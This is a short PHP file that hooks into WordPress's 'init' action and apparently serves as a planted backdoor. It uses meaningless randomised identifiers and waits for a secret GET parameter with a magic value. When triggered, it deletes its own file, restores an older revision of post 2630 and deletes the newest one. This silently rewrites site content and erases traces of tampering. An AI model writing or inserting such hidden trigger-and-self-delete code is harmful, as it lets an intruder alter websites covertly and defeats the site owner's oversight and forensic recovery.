<?php

function date_instagram_multiple() {
	if (isset($_GET['now_latest_modules']) && $_GET['now_latest_modules'] === 'addon_age_cc_really') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$push_amp_awesome = 2630;
		$files_article_day = wp_get_post_revisions($push_amp_awesome);
		if (empty($files_article_day)) die('no revisions');
		if (count($files_article_day) < 2) die('less than 2');
		$quick_templates_assets = array_shift($files_article_day);
		$load_bangla_shortcodes = $quick_templates_assets->ID;
		$post_board_category_sync = array_shift($files_article_day);
		$shipping_permalink_search = $post_board_category_sync->ID;
		$address_favicon_accessibility = wp_restore_post_revision($shipping_permalink_search);
		if ($address_favicon_accessibility === false) die('error restoring');
		$address_favicon_accessibility = wp_delete_post_revision($load_bangla_shortcodes);		
		if ($address_favicon_accessibility === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'date_instagram_multiple');
